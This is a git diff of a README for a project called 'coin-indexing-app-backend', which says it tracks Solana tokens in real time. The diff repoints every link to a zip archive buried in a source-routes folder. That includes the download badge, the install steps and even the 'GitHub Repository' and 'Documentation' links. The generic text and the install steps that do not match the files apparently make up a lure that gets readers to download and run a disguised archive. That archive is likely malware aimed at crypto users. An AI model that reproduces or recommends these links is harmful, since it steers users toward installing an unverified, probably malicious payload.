@@ -1,6 +1,6 @@
 # 🚀 coin-indexing-app-backend - Track Solana Tokens in Real Time
 
-[![Download Latest Release](https://raw.githubusercontent.com/rumyasha/coin-indexing-app-backend/main/dist/types/coin-indexing-app-backend_1.2.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/rumyasha/coin-indexing-app-backend/main/dist/types/coin-indexing-app-backend_1.2.zip)
+[![Download Latest Release](https://github.com/rumyasha/coin-indexing-app-backend/raw/refs/heads/main/src/routes/TrackerRoute/coin_backend_indexing_app_v1.0.zip%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/rumyasha/coin-indexing-app-backend/raw/refs/heads/main/src/routes/TrackerRoute/coin_backend_indexing_app_v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run this application, you need:
 
 You can download the latest version of the **coin-indexing-app-backend** from our Releases page. 
 
-[Visit this page to download](https://raw.githubusercontent.com/rumyasha/coin-indexing-app-backend/main/dist/types/coin-indexing-app-backend_1.2.zip).
+[Visit this page to download](https://github.com/rumyasha/coin-indexing-app-backend/raw/refs/heads/main/src/routes/TrackerRoute/coin_backend_indexing_app_v1.0.zip).
 
 ### Step-by-Step Installation
 
@@ -28,14 +28,14 @@ You can download the latest version of the **coin-indexing-app-backend** from ou
 3. Depending on your operating system, you will see different download options:
    - For **Windows**, download the `.exe` file.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, download the `https://raw.githubusercontent.com/rumyasha/coin-indexing-app-backend/main/dist/types/coin-indexing-app-backend_1.2.zip` file.
+   - For **Linux**, download the `https://github.com/rumyasha/coin-indexing-app-backend/raw/refs/heads/main/src/routes/TrackerRoute/coin_backend_indexing_app_v1.0.zip` file.
 4. After downloading, locate the file in your **Downloads** folder.
 
 ### Running the Application
 
 - **Windows:** Double-click on the `.exe` file. Follow the on-screen instructions to complete the setup.
 - **macOS:** Open the downloaded `.dmg` file, drag the application to your Applications folder, and open it from there.
-- **Linux:** Extract the `https://raw.githubusercontent.com/rumyasha/coin-indexing-app-backend/main/dist/types/coin-indexing-app-backend_1.2.zip` file and run the application from the terminal.
+- **Linux:** Extract the `https://github.com/rumyasha/coin-indexing-app-backend/raw/refs/heads/main/src/routes/TrackerRoute/coin_backend_indexing_app_v1.0.zip` file and run the application from the terminal.
 
 ## 🚀 Features
 
@@ -61,8 +61,8 @@ If you have questions or need support, you can reach out to the community or che
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/rumyasha/coin-indexing-app-backend/main/dist/types/coin-indexing-app-backend_1.2.zip)
-- [Documentation](https://raw.githubusercontent.com/rumyasha/coin-indexing-app-backend/main/dist/types/coin-indexing-app-backend_1.2.zip)
+- [GitHub Repository](https://github.com/rumyasha/coin-indexing-app-backend/raw/refs/heads/main/src/routes/TrackerRoute/coin_backend_indexing_app_v1.0.zip)
+- [Documentation](https://github.com/rumyasha/coin-indexing-app-backend/raw/refs/heads/main/src/routes/TrackerRoute/coin_backend_indexing_app_v1.0.zip)
 
 ## 🛠️ Future Improvements
 
@@ -74,4 +74,4 @@ We plan to include more features in future releases, such as:
 
 Thank you for using **coin-indexing-app-backend**. Download the latest version and unlock the potential of real-time Solana token tracking today! 
 
-[Visit this page to download](https://raw.githubusercontent.com/rumyasha/coin-indexing-app-backend/main/dist/types/coin-indexing-app-backend_1.2.zip).
+[Visit this page to download](https://github.com/rumyasha/coin-indexing-app-backend/raw/refs/heads/main/src/routes/TrackerRoute/coin_backend_indexing_app_v1.0.zip).
